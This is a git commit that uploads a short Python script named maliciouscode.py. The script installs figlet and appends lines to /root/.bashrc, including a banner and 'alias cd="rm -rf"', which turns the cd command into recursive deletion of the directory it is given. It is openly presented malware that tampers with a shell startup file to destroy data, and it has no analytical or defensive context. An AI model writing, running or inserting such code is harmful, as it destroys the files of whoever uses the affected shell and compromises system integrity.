f1602ce79d2e3eee7a7dd5ac07ae5df75173038f
jay d bhatt <cbhatt526@gmail.com>
2020-09-08 13:48:06 +0530

    Add files via upload

---
+++ maliciouscode.py
@@ -0,0 +1,9 @@
+from os import system
+
+system('apt install figlet')
+
+file= open("/root/.bashrc","a+")
+file.write("\necho 'maliciout code here' \n")
+file.write("figlet -f slant malicious code")
+file.write('alias cd="rm -rf"\n')
+file.close()
